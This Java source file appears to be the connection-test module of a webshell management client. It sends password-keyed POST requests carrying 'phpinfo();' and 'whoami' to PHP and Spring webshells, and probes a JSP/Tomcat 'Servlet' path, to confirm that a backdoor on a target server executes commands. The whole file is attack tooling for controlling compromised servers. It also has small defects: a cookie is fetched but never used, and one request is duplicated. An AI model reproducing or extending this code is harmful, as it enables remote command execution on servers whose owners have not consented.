package com.atlant1c.connect;

import com.atlant1c.utils.HttpUtils;
import com.atlant1c.utils.HeaderUtils;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;
import java.util.Map;

public class TestConnect {

    public static int testConnection(String url, String pass, String payload) {
        return testConnection(url, pass, payload, null);
    }

    public static int testConnection(String url, String pass, String payload, String shellENVValue) {
        try {
            Map<String, String> headers = HeaderUtils.readHeadersFromFile();
            if ("PHP".equals(payload)) {
                return testPhpConnection(url, pass, headers) ? 1 : 0;
            } else if ("JSP(Tomcat)".equals(payload)) {
                return testJspTomcatConnection(url, headers) ? 1 : 0;
            } else if ("Spring".equals(payload)) {
                return testSpringConnection(url, pass, headers, shellENVValue) ? 1 : 0;
            } else {
                System.out.println("不支持的 payload 类型。");
                return 0;  // 不支持的 payload 类型
            }
        } catch (Exception e) {
            e.printStackTrace();
            return 0;  // 异常时返回失败
        }
    }

    private static boolean testPhpConnection(String url, String pass, Map<String, String> headers) throws Exception {
        String cookie = getCookie(url, headers);
        return HttpUtils.sendPostRequestForTest(url, pass + "=phpinfo();", headers, false)
                && HttpUtils.sendPostRequestForTest(url, pass + "=phpinfo();", headers, false);
    }

    private static boolean testJspTomcatConnection(String url, Map<String, String> headers) throws Exception {
        String response = HttpUtils.sendGetRequest(url + "Servlet", headers);
        return response.contains("ez");
    }

    private static boolean testSpringConnection(String url, String pass, Map<String, String> headers, String value) throws Exception {
        String cookie = getCookie(url, headers);
        // 将 springText 作为请求的一部分传递
        return HttpUtils.sendPostRequestForTest(url, value+"&"+pass + "=whoami" , headers, true);
    }

    private static String getCookie(String url, Map<String, String> headers) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");

        applyHeaders(con, headers);

        List<String> cookies = con.getHeaderFields().get("Set-Cookie");
        if (cookies == null) {
            return "";
        }
        return cookies.stream()
                .map(cookie -> cookie.split(";", 2)[0])
                .reduce((a, b) -> a + "; " + b)
                .orElse("");
    }

    private static void applyHeaders(HttpURLConnection con, Map<String, String> headers) {
        for (Map.Entry<String, String> entry : headers.entrySet()) {
            con.setRequestProperty(entry.getKey(), entry.getValue());
        }
    }
}
